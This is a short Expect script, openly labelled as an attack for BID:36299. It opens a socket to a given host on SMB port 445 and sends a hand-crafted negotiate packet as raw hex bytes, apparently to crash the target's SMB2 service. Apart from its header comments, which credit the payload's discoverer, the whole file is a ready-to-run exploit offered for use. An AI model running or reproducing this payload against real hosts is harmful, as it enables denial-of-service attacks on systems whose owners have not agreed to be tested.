#!/usr/bin/expect
#
# Attack for BID:36299, now in expect form.
# Discovered by Laurent Gaffie http://g-laurent.blogspot.com, from whom
# the payload is ripped off from.
#
# I)ruid 2009.09

if {[llength $argv] < 1 } {
	send "Usage: smb2.exp <host> \[<port>\]\r\n"
	exit 1
}
set host [lindex $argv 0]
if {[llength $argv] > 1 } {
	set port [lindex $argv 1]
} else {
	set port 445
}

send "Kaboomz\r\n"

set sock [socket $host $port]
spawn -open $sock

send "\x00\x00\x00\x90"
send "\xff\x53\x4d\x42"
send "\x72\x00\x00\x00"
send "\x00\x18\x53\xc8"
send "\x00\x26"
send "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
send "\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54"
send "\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31"
send "\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"
send "\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57"
send "\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61"
send "\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c"
send "\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c"
send "\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e"
send "\x30\x30\x32\x00"

close

